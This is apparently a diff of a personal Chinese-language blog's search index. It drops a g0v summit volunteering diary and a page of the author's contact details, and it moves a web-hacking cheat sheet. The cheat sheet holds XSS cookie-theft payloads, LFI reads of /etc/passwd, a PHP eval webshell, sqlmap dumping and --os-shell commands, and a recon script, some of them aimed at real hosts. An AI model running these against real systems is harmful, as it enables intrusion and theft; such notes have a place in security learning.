-<li>搬椅子</li>
-<li>搬桌子</li>
-<li>場佈</li>
-<li>動線規劃</li>
-<li>拆</li>
-<li>坐在電梯前指引</li>
-<li>被外國人問路</li>
-</ul>
-</li>
-<li>福利<ul>
-<li>吃吃吃吃吃吃吃吃…</li>
-<li>喝喝喝喝喝喝喝喝…</li>
-<li>免費住宿 中研院活動中心</li>
-<li>仙草茶 (呵</li>
-</ul>
-</li>
-</ul>
-<h2 id="Day-0-場佈"><a href="#Day-0-場佈" class="headerlink" title="Day 0(場佈)"></a>Day 0(場佈)</h2><ul>
-<li>搬椅子</li>
-<li>搬桌子</li>
-<li>動線規劃</li>
-<li>吃便當</li>
-<li>晚上去饒河夜市</li>
-</ul>
-<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><ul>
-<li>早餐三明治+紅茶</li>
-<li>坐在電梯前好幾個小時</li>
-<li>R0搬椅子</li>
-<li>閒逛</li>
-<li>吃漢堡 吃撈麵</li>
-<li>聽南韓講者超酷</li>
-<li>有夠累</li>
-<li>睡在VIP room</li>
-<li>房間看西甲</li>
-<li>還以為有夜唱</li>
-</ul>
-<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><ul>
-<li>繼續吃</li>
-<li>聽台灣爬蟲開源資料講者 超幽默</li>
-<li>仙草茶</li>
-<li>有個阿北專門來吃東西的</li>
-<li>收桌子</li>
-<li>拆東西</li>
-<li>在閉幕簡報上看到自己 很感動</li>
-<li>慶功宴 佛跳牆 龍蝦 雞佛 啤酒好欸</li>
-<li>才知道現場很多都是資工大佬 頂大好電</li>
-<li>大家都很好聊 一堆E人</li>
-<li>CPY有問題找他就對了 兆翌超好聊 喬不會喝酒笑死 柚子講者超電 賴彥江超幽默 </li>
-<li>口譯大哥說他18歲 pm5光頭超好認 攝影大哥敬酒*n次 室友雨辰居然是文組的</li>
-<li>有人喝醉超好笑 啤酒而已欸</li>
-<li>搭高鐵 好不捨</li>
-<li>整個g0v氣氛好好 好喜歡 2026再來!</li>
-</ul>
-<h1 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h1><p>我愛g0v summit，氣氛好讚，工人福利給過，認識好多新朋友，g0v summit 2026見!</p>
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=huxpnnqf&nd=6&style=11" border="0" alt="網頁計數器"></a></p>
-<!-- End of CuterCounter Code -->
-]]></content>
-      <categories>
-        <category>紀錄</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>個人時間表</title>
-    <url>/personal_schedule/</url>
-    <content><![CDATA[<h1 id="此為-2024-10月-2025寒假前-日程表"><a href="#此為-2024-10月-2025寒假前-日程表" class="headerlink" title="此為 2024&#x2F;10月-2025寒假前 日程表"></a>此為 2024&#x2F;10月-2025寒假前 日程表</h1><p><img src="/images/sch.png"></p>
-<ul>
-<li>藍色: 在學校</li>
-<li>綠色: 在家裡忙</li>
-<li>紫色: 社團</li>
-<li>灰色: 空閒</li>
-</ul>
-<p>聯絡方式:</p>
-<ul>
-<li>email: <a href="mailto:dylan.jc2222@gmail.com" title="吳昕哲">吳昕哲</a></li>
-<li>discord: <a href="https://discordapp.com/users/768889520280043561" title="che哲#4541">che哲#4541</a></li>
-<li>instagram: <a href="https://www.instagram.com/che._.wu/" title="che._.wu">che._.wu</a></li>
-</ul>
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hxqxdco&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
-<!-- End of CuterCounter Code -->
-
-]]></content>
-      <categories>
-        <category>個人時間表</category>
-      </categories>
-  </entry>
-  <entry>
     <title>電資類競賽分享</title>
     <url>/sources-share/</url>
     <content><![CDATA[<h2 id="主要競賽-具指標性"><a href="#主要競賽-具指標性" class="headerlink" title="主要競賽(具指標性):"></a>主要競賽(具指標性):</h2><p>競程類</p>
@@ -1447,7 +1447,7 @@ ABaB
 <li>Neither the title nor the URL includes any sensitive keywords.</li>
 <li>It’s very unlikely for someone to find this post via Google or other search engines.</li>
 </ul>
-<h2 id="If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-100-121-x6c-97-110-46-x6a-x63-x32-x32-50-x32-x40-x67-109-x61-105-108-46-99-111-109-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding"><a href="#If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-100-121-x6c-97-110-46-x6a-x63-x32-x32-50-x32-x40-x67-109-x61-105-108-46-99-111-109-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding" class="headerlink" title="If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at &#100;&#121;&#x6c;&#97;&#110;&#46;&#x6a;&#x63;&#x32;&#x32;&#50;&#x32;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#109; — I will remove it promptly upon request.To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!"></a>If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at <a href="mailto:&#100;&#121;&#x6c;&#97;&#110;&#46;&#x6a;&#x63;&#x32;&#x32;&#50;&#x32;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;">&#100;&#121;&#x6c;&#97;&#110;&#46;&#x6a;&#x63;&#x32;&#x32;&#50;&#x32;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;</a> — I will remove it promptly upon request.<br>To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!</h2><h1 id="解說"><a href="#解說" class="headerlink" title="解說"></a>解說</h1><p>平台上的題目跟一般的CTF不太一樣，一般CTF是連去指定的ip做操作，但是這平台上的題目是會開啟虛擬機並讓你以一般使用者的帳號，通過web去取得&#x2F;flag的檔案，而他給的web都是用root權限的，也就是說，你必須透過自行啟用web的python檔案，並在這個web上透過漏洞而以root身分取得&#x2F;flag的檔案。</p>
+<h2 id="If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-x64-x79-108-x61-x6e-46-x6a-99-x32-x32-x32-x32-64-x67-109-97-105-108-46-x63-111-109-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding"><a href="#If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-x64-x79-108-x61-x6e-46-x6a-99-x32-x32-x32-x32-64-x67-109-97-105-108-46-x63-111-109-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding" class="headerlink" title="If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at &#x64;&#x79;&#108;&#x61;&#x6e;&#46;&#x6a;&#99;&#x32;&#x32;&#x32;&#x32;&#64;&#x67;&#109;&#97;&#105;&#108;&#46;&#x63;&#111;&#109; — I will remove it promptly upon request.To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!"></a>If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at <a href="mailto:&#x64;&#x79;&#108;&#x61;&#x6e;&#46;&#x6a;&#99;&#x32;&#x32;&#x32;&#x32;&#64;&#x67;&#109;&#97;&#105;&#108;&#46;&#x63;&#111;&#109;">&#x64;&#x79;&#108;&#x61;&#x6e;&#46;&#x6a;&#99;&#x32;&#x32;&#x32;&#x32;&#64;&#x67;&#109;&#97;&#105;&#108;&#46;&#x63;&#111;&#109;</a> — I will remove it promptly upon request.<br>To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!</h2><h1 id="解說"><a href="#解說" class="headerlink" title="解說"></a>解說</h1><p>平台上的題目跟一般的CTF不太一樣，一般CTF是連去指定的ip做操作，但是這平台上的題目是會開啟虛擬機並讓你以一般使用者的帳號，通過web去取得&#x2F;flag的檔案，而他給的web都是用root權限的，也就是說，你必須透過自行啟用web的python檔案，並在這個web上透過漏洞而以root身分取得&#x2F;flag的檔案。</p>
 <h1 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h1><p>pwn.college網路上都找不到write up，花了很多時間在深入研究bypass，但也學到很多xd，以下進入正題。</p>
 <hr>
 <h1 id="Path-Traversal-1"><a href="#Path-Traversal-1" class="headerlink" title="Path Traversal 1"></a>Path Traversal 1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We&#x27;ve implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?</span><br><span class="line"></span><br><span class="line">The webserver program is /challenge/server. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!</span><br><span class="line"></span><br><span class="line">HINT: If you&#x27;re wondering why your solution isn&#x27;t working, make sure what you&#x27;re trying to query is what is actually being received by the server! curl -v [url] can show you the exact bytes that curl is sending over.</span><br></pre></td></tr></table></figure>
@@ -1752,55 +1752,6 @@ ABaB
       </categories>
   </entry>
   <entry>
-    <title>測試用</title>
-    <url>/ss/</url>
-    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>隱藏的檔案</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/git (網頁上看到 Forbidden(403) 通常都是 有這個資料夾)</span><br><span class="line">/.git/index</span><br><span class="line"></span><br><span class="line">git clone https://github.com/BugScanTeam/GitHack.git</span><br><span class="line">執行githack.py</span><br><span class="line"></span><br><span class="line">ex: python2 GitHack.py https://140.134.25.138:10005/.git/</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.DS_Store</span><br><span class="line"></span><br><span class="line">git clone https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line"></span><br><span class="line">ex: python2 ds_store_exp.py 140.134.25.138:10006/.DS_Store</span><br></pre></td></tr></table></figure>
-<p>暴力目錄遍歷</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb 網址</span><br></pre></td></tr></table></figure>
-<p>port掃描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -p- -v -T4 (IP)</span><br></pre></td></tr></table></figure>
-<p>網站弱點掃描(kali內建)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -h 網址 -o 輸出檔案(不選擇輸出在終端機上)</span><br><span class="line"></span><br><span class="line">ex: nikto -h https://innopac.lib.fcu.edu.tw/ -o result.html</span><br></pre></td></tr></table></figure>
-
-
-<p>查找封包原始內容 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查Way Back Machine，輸入ip+port</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>會把整個頁面的head全刪除，留下一句Hacked就跑了<br>(勿試)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.getElementsByTagName(&#x27;body&#x27;)[0].innerHTML=&quot;Hacked&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>Dom XSS(?<br>圖片語法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;才不存在呢&quot; onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>實戰偷cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
-
-<p>實作偷別人的cookie教學<br>(勿試)<br><code>https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1</code></p>
-<hr>
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page=c:/Windows/System32/drivers/etc/hosts</span><br><span class="line">page=/etc/passwd</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>php木馬</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_GET[CMD]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">(要執行的時候就hack.php?CMD=phpinfo())</span><br></pre></td></tr></table></figure>
-
-<p>上傳檔案如果有鎖副檔名，用burpsuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">轉</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
-
-<h2 id="b374k，後門phpXST"><a href="#b374k，後門phpXST" class="headerlink" title="b374k，後門phpXST"></a>b374k，後門php<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">檔案存在kali桌面了</span><br></pre></td></tr></table></figure><br>XST<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></h2><p>SQL injection</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 注入点 检测注入点是否可用</span><br><span class="line">sqlmap -u 注入点 –batch 自动输入</span><br><span class="line">暴库</span><br><span class="line">sqlmap -u 注入点 –dbs //暴库</span><br><span class="line">Web当前使用的数据库</span><br><span class="line">sqlmap -u 注入点 –current-db //爆当前使用的库</span><br><span class="line">Web数据库使用的账户</span><br><span class="line">sqlmap -u 注入点 –current-user //当前使用的账户</span><br><span class="line">列出sqlserver所有用户</span><br><span class="line">sqlmap -u 注入点 –users // 列出所有使用过的账户</span><br><span class="line">数据库账户与密码</span><br><span class="line">sqlmap -u 注入点 –passwords //mysql的登录账户和密码</span><br><span class="line">列出数据库中的表</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 –tables //(-D指定数据库名称)</span><br><span class="line">列出表中字段</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定的表名 –columns</span><br><span class="line">爆字段内容</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定表名 -C “email,username,userpassword” –dump (将结果导出)</span><br><span class="line">指定导出特定范围字段内容</span><br><span class="line">sqlmap -u注入点-D tourdata -T userb -C “email,username,userpassword”–start 1 –stop 10 –dump (1,10行数)</span><br><span class="line">Cookie注入</span><br><span class="line">sqlmap -u “注入点” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –table –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –dump -C “username,password”–columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">可对以上参数进行结合使用</span><br><span class="line">python sqlmap.py -u “注入点” -f –banner –dbs –users</span><br><span class="line"></span><br><span class="line">post登陆注入 mssql</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http:” –data “tfUName=12345&amp;tfUPass=12345” –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –tables -D “数据库名” ==列表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –columns -T “表名” -D “数据库名” ==暴字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345” –dump –columns -C “字段,字段” -T “表” -D “数据名” ==暴字段内容</span><br><span class="line"></span><br><span class="line">伪静态注入</span><br><span class="line">注入点：http://.html （注意：要加个* 哪里存在注入就加上 * 号）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –tables -D “数据名” ==获取数据库当中的表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –columns -D “数据名” -T “表名” ==获取数据库的表中的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://*.html –dump -D “数据名” -T “表名” -C “字段,字段” ==获取数据库的表中的字段内容</span><br><span class="line"></span><br><span class="line">绕过防火墙注入</span><br><span class="line">确认是否开了WAF</span><br><span class="line">Sqlmap -u “注入点” –thread 10 –identify-waf (首选)</span><br><span class="line">sqlmap -u “注入点” –thread 10 –check-waf 备选</span><br><span class="line">使用参数绕过</span><br><span class="line">Sqlmap -u “注入点” –random-agent -v 2 （浏览器绕过）</span><br><span class="line">Sqlmap -u “注入点” –hpp -v 3 (参数污染绕过)</span><br><span class="line">Sqlmap -u “注入点” –delay=3.5 –time-sec=60</span><br><span class="line">Sqlmap -u “注入点” –proxy=211.211.211.211.8080 –proxy-cred=211.:985 代理注入</span><br><span class="line">sqlmap -u “注入点” –ignore-proxy 禁止用代理注入，直接注入</span><br><span class="line">sqlmap -u “注入点” –flush-session 清空会话，重构注入</span><br><span class="line">sqlmap -u “注入点” -hex 或者–no-cast 进行字符码转换</span><br><span class="line">sqlmap -u “注入点” –mobile 对移动端的服务器进行注入</span><br><span class="line">sqlmap -u “注入点” –tor 匿名注入</span><br><span class="line"></span><br><span class="line">直接拿shell或者执行命令（需要权限很大跟物理路径）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-shell</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url –os-cmd=ipconfig</span><br><span class="line"></span><br><span class="line">请求延时（一般突破防火墙）</span><br><span class="line"></span><br><span class="line">第一种方法：sqlmap.py -u url –delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）</span><br><span class="line">第二种方法： sqlmap.py -u url –safe-freq 3 （注意：3是3次的意思。。）</span><br><span class="line"></span><br><span class="line">可以组合使用 sqlmap.py -u url –delay 2 –safe-freq 3</span><br><span class="line"></span><br><span class="line">测试注入点权限：</span><br><span class="line">sqlmap -u url –privileges</span><br><span class="line"></span><br><span class="line">执行shell命令命令</span><br><span class="line">sqlmap -u url –os-cmd=”net user” //执行netuser命令</span><br><span class="line">sqlmap -u url –os-shell //系统交互的shell</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
-<p><a href="https://hackmd.io/@bttea/sqlmap_common_parameters">https://hackmd.io/@bttea/sqlmap_common_parameters</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ $# -ne 1 ];then</span><br><span class="line">    echo &quot;Usage: $0 &lt;target&gt;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">target=$1</span><br><span class="line">mkdir -p recon-$target</span><br><span class="line">cd recon-$target</span><br><span class="line">echo &quot;[*] 正在初始化偵查目標: $target&quot;</span><br><span class="line"></span><br><span class="line"># 1. Whois / DNS 基本資料搜集</span><br><span class="line">echo &quot;[*] Whois資訊搜集...&quot;</span><br><span class="line">whois $target &gt; whois.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] DNS資訊搜集...&quot;</span><br><span class="line">dig $target any &gt; dig_any.txt</span><br><span class="line">dig $target mx &gt; dig_mx.txt</span><br><span class="line">dig $target txt &gt; dig_txt.txt</span><br><span class="line">host -a $target &gt; host.txt</span><br><span class="line">nslookup $target &gt; nslookup.txt</span><br><span class="line"></span><br><span class="line"># 2. 子域名搜集（Kali內建）</span><br><span class="line">echo &quot;[*] 子域名收集(dnsenum+fierce+dnsrecon)...&quot;</span><br><span class="line">dnsenum $target -o dnsenum.xml</span><br><span class="line">fierce --domain $target &gt; fierce.txt</span><br><span class="line">dnsrecon -d $target -a &gt; dnsrecon.txt</span><br><span class="line"></span><br><span class="line"># 3. theHarvester 整合收集Email/帳號/子域</span><br><span class="line">echo &quot;[*] theHarvester收集Email/帳號...&quot;</span><br><span class="line">theHarvester -d $target -b all -f theharvester.html</span><br><span class="line"></span><br><span class="line"># 4. 技術棧分析 (whatweb+curl頭部)</span><br><span class="line">echo &quot;[*] 技術棧分析...&quot;</span><br><span class="line">whatweb -v $target &gt; whatweb.txt</span><br><span class="line">curl -I http://$target &gt; curl_headers.txt</span><br><span class="line"></span><br><span class="line"># 5. Nmap大範圍掃描</span><br><span class="line">echo &quot;[*] Nmap完整掃描...&quot;</span><br><span class="line">nmap -sS -sV -p- -v -T4 $target -oA nmap_fullscan</span><br><span class="line"></span><br><span class="line">echo &quot;[*] Nmap HTTP相關漏洞掃描...&quot;</span><br><span class="line">timeout 60 nmap --script=http-enum,http-vuln* -p 80,443 $target -oA nmap_http_enum</span><br><span class="line"></span><br><span class="line"># 6. HTTP Method測試</span><br><span class="line">echo &quot;[*] HTTP Method探測...&quot;</span><br><span class="line">curl -X OPTIONS -I http://$target &gt; http_methods.txt</span><br><span class="line"></span><br><span class="line"># 7. 爆破目錄與檔案 (gobuster/dirb/wfuzz)</span><br><span class="line">echo &quot;[*] gobuster目錄爆破...&quot;</span><br><span class="line">gobuster dir -u http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,jsp,php,html,txt,zip,bak,tar.gz -t 50 &gt; gobuster.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] dirb目錄爆破...&quot;</span><br><span class="line">dirb http://$target /usr/share/wordlists/dirb/common.txt &gt; dirb.txt</span><br><span class="line"></span><br><span class="line">echo &quot;[*] wfuzz爆破...&quot;</span><br><span class="line">wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$target/FUZZ &gt; wfuzz.txt</span><br><span class="line"></span><br><span class="line"># 8. Google Hacking提示</span><br><span class="line">echo &quot;[*] Google Hacking建議語法，請手動搜尋:&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line">echo &quot;site:$target ext:sql | ext:bak | ext:old | ext:backup&quot;</span><br><span class="line">echo &quot;site:$target intitle:\&quot;index of\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;admin\&quot; | \&quot;login\&quot;&quot;</span><br><span class="line">echo &quot;site:$target inurl:\&quot;upload\&quot; | \&quot;submit\&quot;&quot;</span><br><span class="line">echo &quot;site:$target ext:xml | ext:json | ext:conf | ext:env | ext:jsp&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Warning\&quot; | \&quot;Fatal error\&quot; | \&quot;unexpected token\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;phpinfo()\&quot;&quot;</span><br><span class="line">echo &quot;site:$target \&quot;DB_PASSWORD\&quot; | \&quot;AWS_SECRET_ACCESS_KEY\&quot;&quot;</span><br><span class="line">echo &quot;cache:$target&quot;</span><br><span class="line">echo &quot;site:$target filetype:pdf | filetype:docx&quot;</span><br><span class="line">echo &quot;site:$target \&quot;Apache Tomcat\&quot; | \&quot;Jenkins\&quot; | \&quot;Confluence\&quot;&quot;</span><br><span class="line">echo &quot;----------------------------------------&quot;</span><br><span class="line"></span><br><span class="line"># 9. 歷史資料蒐集</span><br><span class="line">echo &quot;[*] 手動挖掘Archive歷史頁面，嘗試存取Wayback Machine...&quot;</span><br><span class="line">curl &quot;http://web.archive.org/cdx/search/cdx?url=$target/*&amp;output=text&amp;fl=original&quot; &gt; archive_urls.txt</span><br><span class="line"></span><br><span class="line"># 10. SSL掃描</span><br><span class="line">echo &quot;[*] SSL弱點掃描...&quot;</span><br><span class="line">sslscan $target &gt; sslscan.txt</span><br><span class="line"></span><br><span class="line"># 11. 旁站偵測</span><br><span class="line">echo &quot;[*] 旁站偵測(http-vhosts)...&quot;</span><br><span class="line">nmap --script=http-vhosts -p 80 $target -oA vhost_enum</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 偵查完成，所有資料已經收集！&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><a href="https://otx.alienvault.com/indicator/ip/210.69.167.102">https://otx.alienvault.com/indicator/ip/210.69.167.102</a></p>
-]]></content>
-      <categories>
-        <category>資安</category>
-      </categories>
-  </entry>
-  <entry>
     <title>漏洞紀錄</title>
     <url>/vulnerability/</url>
     <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><table>
@@ -1917,6 +1868,55 @@ ABaB
 <li>嚴重風險: 2</li>
 </ul>
 <p>總計: 16</p>
+]]></content>
+      <categories>
+        <category>資安</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>測試用</title>
+    <url>/ss/</url>
+    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>隱藏的檔案</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/git (網頁上看到 Forbidden(403) 通常都是 有這個資料夾)</span><br><span class="line">/.git/index</span><br><span class="line"></span><br><span class="line">git clone https://github.com/BugScanTeam/GitHack.git</span><br><span class="line">執行githack.py</span><br><span class="line"></span><br><span class="line">ex: python2 GitHack.py https://140.134.25.138:10005/.git/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.DS_Store</span><br><span class="line"></span><br><span class="line">git clone https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line"></span><br><span class="line">ex: python2 ds_store_exp.py 140.134.25.138:10006/.DS_Store</span><br></pre></td></tr></table></figure>
+<p>暴力目錄遍歷</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb 網址</span><br></pre></td></tr></table></figure>
+<p>port掃描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -p- -v -T4 (IP)</span><br></pre></td></tr></table></figure>
+<p>網站弱點掃描(kali內建)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -h 網址 -o 輸出檔案(不選擇輸出在終端機上)</span><br><span class="line"></span><br><span class="line">ex: nikto -h https://innopac.lib.fcu.edu.tw/ -o result.html</span><br></pre></td></tr></table></figure>
+
+
+<p>查找封包原始內容 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查Way Back Machine，輸入ip+port</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>會把整個頁面的head全刪除，留下一句Hacked就跑了<br>(勿試)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.getElementsByTagName(&#x27;body&#x27;)[0].innerHTML=&quot;Hacked&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>Dom XSS(?<br>圖片語法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;才不存在呢&quot; onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>實戰偷cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p>實作偷別人的cookie教學<br>(勿試)<br><code>https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1</code></p>
+<hr>
+<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page=c:/Windows/System32/drivers/etc/hosts</span><br><span class="line">page=/etc/passwd</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>php木馬</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_GET[CMD]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">(要執行的時候就hack.php?CMD=phpinfo())</span><br></pre></td></tr></table></figure>
+
+<p>上傳檔案如果有鎖副檔名，用burpsuite:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">轉</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+
+<h2 id="b374k，後門phpXST"><a href="#b374k，後門phpXST" class="headerlink" title="b374k，後門phpXST"></a>b374k，後門php<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">檔案存在kali桌面了</span><br></pre></td></tr></table></figure><br>XST<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></h2><p>SQL injection</p>
